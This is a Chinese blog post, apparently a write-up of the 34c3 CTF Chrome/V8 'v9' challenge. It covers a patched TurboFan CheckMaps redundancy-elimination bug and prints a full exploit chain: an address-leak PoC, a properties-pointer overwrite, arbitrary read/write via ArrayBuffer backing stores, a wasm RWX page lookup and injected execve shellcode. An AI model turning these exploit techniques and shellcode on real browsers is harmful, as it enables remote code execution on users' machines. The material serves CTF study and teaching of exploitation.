---

layout: post

title: '34c3ctf-chrome-pwn分析'

date: '2020-08-05'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'

---

<!-- more -->

## 前言

### 环境搭建

```c
git reset --hard 6.3.292.48
gclient sync
patch -p1 < ../v9/v9.patch
./tools/dev/gm.py x64.debug
./tools/dev/gm.py x64.release
```

### setFloat64方法（DataView）

![image-20200806103724319](..\image\2020-08-05-34c3ctf-chrome-pwn分析\2.png)

可以用来填写buf1->backing_store+byteOffset偏移的数据，如果buf1->backing_store填充的是另一个ArrayBuffer buf2的地址，则setFloat64(31, value, true) 就是将value写到buf2+byteOffset（31）的位置， 即buf2->backing_store，用于构造任意读写原语。

![image-20200806111047191](..\image\2020-08-05-34c3ctf-chrome-pwn分析\3.png)



## 漏洞分析

引入的漏洞补丁：

```c
diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc
index 3a40e8d..cb51acc 100644
--- a/src/compiler/redundancy-elimination.cc
+++ b/src/compiler/redundancy-elimination.cc
@@ -5,6 +5,8 @@
 #include "src/compiler/redundancy-elimination.h"
 
 #include "src/compiler/node-properties.h"
+#include "src/compiler/simplified-operator.h"
+#include "src/objects-inl.h"
 
 namespace v8 {
 namespace internal {
@@ -23,6 +25,7 @@ Reduction RedundancyElimination::Reduce(Node* node) {
     case IrOpcode::kCheckHeapObject:
     case IrOpcode::kCheckIf:
     case IrOpcode::kCheckInternalizedString:
+    case IrOpcode::kCheckMaps:
     case IrOpcode::kCheckNumber:
     case IrOpcode::kCheckReceiver:
     case IrOpcode::kCheckSmi:
@@ -129,6 +132,14 @@ bool IsCompatibleCheck(Node const* a, Node const* b) {
     if (a->opcode() == IrOpcode::kCheckInternalizedString &&
         b->opcode() == IrOpcode::kCheckString) {
       // CheckInternalizedString(node) implies CheckString(node)
+    } else if (a->opcode() == IrOpcode::kCheckMaps &&
+               b->opcode() == IrOpcode::kCheckMaps) {
+      // CheckMaps are compatible if the first checks a subset of the second.
+      ZoneHandleSet<Map> const& a_maps = CheckMapsParametersOf(a->op()).maps();
+      ZoneHandleSet<Map> const& b_maps = CheckMapsParametersOf(b->op()).maps();
+      if (!b_maps.contains(a_maps)) {
+        return false;
+      }
     } else {
       return false;
     }
```

补丁引入了一个kCheckMaps的优化策略，优化的原理：循环遍历check 链表，当前面的节点已经kCheckMaps, 则消除当前的节点的检查。

漏洞函数调用链：

```c
Reduction RedundancyElimination::Reduce(Node* node)
    ->case IrOpcode::kCheckMaps:
	->ReduceCheckNode(node);
		->checks->LookupCheck(node)
            ->IsCompatibleCheck(check->node, node)  // 漏洞补丁引入的函数
            	->else if (a->opcode() == IrOpcode::kCheckMaps && b->opcode() == IrOpcode::kCheckMaps)
                    -> ZoneHandleSet<Map> const& a_maps = CheckMapsParametersOf(a->op()).maps();
					-> ZoneHandleSet<Map> const& b_maps = CheckMapsParametersOf(b->op()).maps();
					-> if (!b_maps.contains(a_maps)) {
                        return false;
                    //当第二个参数结点的maps包含第一个结点的maps时,则认为这两个结点是“兼容”的，即可去除后面的检查。
            
```

PoC代码：

```javascript
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

var obj = {x:1.1, y:2.2};

let o = {a: 13.37, b: 14.47};

function triggerReadTypeConfuse(o, callback) {
    var tmp = o.a;
    callback();
    return o.b;
}
function evil() {
    o.b = obj
}
for(let i=0; i<100000; i++) {
    triggerReadTypeConfuse(o, ()=>1);
    triggerReadTypeConfuse(o, ()=>2);
    triggerReadTypeConfuse(o, ()=>3);
}

let addr = f2i(triggerReadTypeConfuse(o, evil));

console.log("obj addr: 0x"+hex(addr));

%DebugPrint(obj);
```

Poc代码中首先访问o.a 进行kCheckMaps检查，未优化时访问o.b 仍会进行kCheckMaps检查，经过循环处理，TurboFan会对代码进行优化，将o.b处的kCheckMaps检查消除，再次调用triggerReadTypeConfuse，造成在evil函数中对o.b=obj赋值成功，将obj对象地址当成浮点数返回，造成信息泄露。

![image-20200805154641200](..\image\2020-08-05-34c3ctf-chrome-pwn分析\1.png)



## 漏洞利用

通过覆盖对象的properties 指针来实现ArrayBuffer的backing_store 指针的修改

### （1）构造addOf原语

即Poc代码，可用于泄露对象地址

### （2）修改对象的properties 进行任意读写

当对象的properties 是浮点数类型时，以下面代码为例：

```javascript
var o = {a: 1};
o.b = 13.37;
%DebugPrint(o);
%SystemBreak();
```

内存布局如下：

![image-20200806140310822](..\image\2020-08-05-34c3ctf-chrome-pwn分析\6.png)

触发漏洞，和Poc类似，进行优化后调用evil()函数将victim对象覆盖到o.b，即将上图中的【2】覆盖成victim对象的地址

```javascript
var victim = {inline:42};
victim.offset0 = {};
victim.offset8 = {};
victim.offset16 = {};
```

覆盖成功后的内存布局如下：

![image-20200806120232778](..\image\2020-08-05-34c3ctf-chrome-pwn分析\5.png)

从图中可以看到，【2】处的o.b已经被覆盖成victim对象的地址，【3】处的value已经变成victim对象的properties。

之后再通过o.b = value; 就可以将victim的properties修改成value。

代码如下：

```javascript
function overwrite_p(target, value){
	var o = {a: 1};
	o.b = 13.27;
	function triggerReadTypeConfuse(o, callback) {
    		var tmp = o.a;
    		callback();
			o.b = value; //<----------
    		return o.b;
	}
	function evil() {
    		o.b = target;
	}
	for(let i=0; i<100000; i++) {
    		triggerReadTypeConfuse(o, ()=>1);
    		triggerReadTypeConfuse(o, ()=>2);
    		triggerReadTypeConfuse(o, ()=>3);
	}
	var r = triggerReadTypeConfuse(o, evil);
}

var data_buf = new ArrayBuffer(200);

gc();

var data_buf_addr = addrOf(data_buf);
var victim = {inline:42};
victim.offset0 = {};
victim.offset8 = {};
victim.offset16 = {};

overwrite_p(victim, i2f(data_buf_addr));

var view_buf = new ArrayBuffer(200);
victim.offset16 = view_buf;
```

而properties 指针指向非数字索引属性存储的数据，因此当对非数字索引的属性进行修改时，v8会通过properties来寻找目标属性进行修改。以victim对象为例，victim.offset0，victim.offset8，victim.offset16分别存储在properties地址+0x10，+0x18，+0x20处：

![image-20200806142547013](..\image\2020-08-05-34c3ctf-chrome-pwn分析\7.png)

所以当victim->properties被覆盖成data_buf的地址时，此时victim.offset16对应着data_buf->backing_store，可以修改victim.offset16进而修改data_buf->backing_store。

### （3）构造任意读写原语

讲道理，已经能修改data_buf->backing_store了，就很方便进行任意读写了，但是由于下面一步查找wasm_function 地址，要通过data_buf->map->instance descriptors查找，所以data_buf->backing_store要填充data_buf本身的地址，这一步在调试过程中发现无法成功（具体原因不清楚），所以需要申请另一个ArrayBuffer view_buf，通过view_buf->backing_store进行任意读写。

```javascript
var view_buf = new ArrayBuffer(200);
victim.offset16 = view_buf;

var data_view = new DataView(data_buf);

function dataview_read64(addr)
{
	data_view.setFloat64(31, i2f(addr), true);
	var view_view = new DataView(view_buf);
	return f2i(view_view.getFloat64(0, true));
}

//----- arbitrary write

function dataview_write(addr, payload)
{
	data_view.setFloat64(31, i2f(addr), true);
	var view_view = new DataView(view_buf);
	for(let i=0; i < payload.length; i++)
	{
		view_view.setUint8(i, payload[i]);
	}
}
```

利用victim.offset16 = view_buf; 将 data_buf->backing_store 填充成view_buf的地址，根据前言中setFloat64方法的介绍，可以利用data_view.setFloat64(31, i2f(addr), true); 修改view_buf->backing_store 为目标地址，利用view_view进行任意地址读写。

### （4）查找wasm_function 地址

直接通过addrOf无法获取wasm_function的地址，通过data_buf->map->instance descriptors进行查找，具体方法如下：

将wasm_function 对象保存在 data_buf 新定义的属性leakobj，后面可以根据map->instance descriptors 找到wasm_function对象，利用任意读泄露wasm_function 地址。

```c
pwndbg> job 0x26aa75e88e29   <----------data_buf
0x26aa75e88e29: [JSArrayBuffer] in OldSpace
 - map = 0x36134bc8a5e1 [FastProperties]    <-----------map
 - prototype = 0x26aa75e8b7b9
 - elements = 0x2b6a10f82251 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store = 0x30ef9d224311
 - byte_length = 200
 - neuterable
 - properties = 0x2b6a10f82251 <FixedArray[0]> {
    #leakobj: 0x26aa75eabf09 <JSFunction 0 (sfi = 0x26aa75eabdc9)> (const data descriptor)<-----wasm function
 }
 - embedder fields = {
    (nil)
    (nil)
 }
pwndbg> job 0x36134bc8a5e1       <---------------------map
0x36134bc8a5e1: [Map]
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 80
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x36134bc82f71 <Map(HOLEY_ELEMENTS)>
 - instance descriptors (own) #1: 0x30ef9d2243a1 <FixedArray[5]>  <--------------instance descriptors
 - layout descriptor: (nil)
 - prototype: 0x26aa75e8b7b9 <Object map = 0x36134bc8a631>
 - constructor: 0x26aa75e8b609 <JSFunction ArrayBuffer (sfi = 0x2b6a10fb3711)>
 - dependent code: 0x2b6a10f82251 <FixedArray[0]>
 - construction counter: 0
pwndbg> job 0x30ef9d2243a1                             <--------------instance descriptors
0x30ef9d2243a1: [FixedArray]
 - map = 0x1a6f8cc022f1 <Map(HOLEY_ELEMENTS)>
 - length: 5
           0: 1
           1: 0x2b6a10f849d1 <Tuple2 0x2b6a10f82251 <FixedArray[0]>, 0x2b6a10f82251 <FixedArray[0]>>
           2: 0x26aa75ebaa11 <String[7]: leakobj>
           3: 518
           4: 0x26aa75eabf09 <JSFunction 0 (sfi = 0x26aa75eabdc9)> <----- wasm function

```

获取wasm_function对象地址的代码：

```javascript
function addrOfWasmObj(obj){
	data_buf.leakobj = obj;
	let mapAddr = dataview_read64(data_buf_addr-1);
	let instance_addr = dataview_read64(mapAddr + 0x2f);
	let objAddr = dataview_read64(instance_addr + 0x2f);
	return objAddr;
}
```



exp 代码：

```javascript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	let tmp = Array.from(Uint32);
	return tmp[1] * 0x100000000 + tmp[0]; 
}

function i2f(i)
{
	let tmp = [];
	tmp[0] = parseInt(i % 0x100000000);
	tmp[1] = parseInt((i-tmp[0]) / 0x100000000);
	Uint32.set(tmp);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}


function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

function addrOf(obj){

	let o = {a: 13.37, b: 14.47};

	function triggerReadTypeConfuse(o, callback) {
    		var tmp = o.a;
    		callback();
    		return o.b;
	}
	function evil() {
    		o.b = obj;
	}
	for(let i=0; i<100000; i++) {
    		triggerReadTypeConfuse(o, ()=>1);
    		triggerReadTypeConfuse(o, ()=>2);
   			triggerReadTypeConfuse(o, ()=>3);
	}

	let addr = f2i(triggerReadTypeConfuse(o, evil));
	return addr;
}

function overwrite_p(target, value){
	var o = {a: 1};
	o.b = 13.27;
	function triggerReadTypeConfuse(o, callback) {
    		var tmp = o.a;
    		callback();
			o.b = value;
    		return o.b;
	}
	function evil() {
    		o.b = target;
	}
	for(let i=0; i<100000; i++) {
    		triggerReadTypeConfuse(o, ()=>1);
    		triggerReadTypeConfuse(o, ()=>2);
    		triggerReadTypeConfuse(o, ()=>3);
	}
	var r = triggerReadTypeConfuse(o, evil);
}

var data_buf = new ArrayBuffer(200);

gc(); // 需要进行垃圾回收，将data_buf移到old space，并且地址不会再变化，不进行回收，后续会失败。

var data_buf_addr = addrOf(data_buf);
var victim = {inline:42};

victim.offset0 = {};
victim.offset8 = {};
victim.offset16 = {};

overwrite_p(victim, i2f(data_buf_addr));

var view_buf = new ArrayBuffer(200);
victim.offset16 = view_buf;

var data_view = new DataView(data_buf);

function dataview_read64(addr)
{
	data_view.setFloat64(31, i2f(addr), true);
	var view_view = new DataView(view_buf);
	return f2i(view_view.getFloat64(0, true));
}

//----- arbitrary write

function dataview_write(addr, payload)
{
	data_view.setFloat64(31, i2f(addr), true);
	var view_view = new DataView(view_buf);
	for(let i=0; i < payload.length; i++)
	{
		view_view.setUint8(i, payload[i]);
	}
}

function addrOfWasmObj(obj){
	data_buf.leakobj = obj;
	let mapAddr = dataview_read64(data_buf_addr-1);
	let instance_addr = dataview_read64(mapAddr + 0x2f);
	let objAddr = dataview_read64(instance_addr + 0x2f);
	return objAddr;
}

var wasm_function_addr = addrOfWasmObj(wasm_function);
console.log("[+] wasm_function_addr : 0x" + hex(wasm_function_addr));

var wasm_shared_info = dataview_read64(wasm_function_addr -1 + 0x20);
console.log("[+] find wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_code = dataview_read64(wasm_shared_info -1 + 0x8);
console.log("[+] find wasm_code : 0x" + hex(wasm_code));

var wasm_rwx = wasm_code - 0x81 + 0xe0;
console.log("[+] find wasm_rwx : 0x" + hex(wasm_rwx));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_rwx, shellcode);

wasm_function();
```

运行效果图：

![image-20200806150241621](..\image\2020-08-05-34c3ctf-chrome-pwn分析\8.png)



## 参考链接

https://github.com/ray-cp/browser_pwn/tree/master/v8_pwn/34c3ctf-v9

https://github.com/saelo/v9

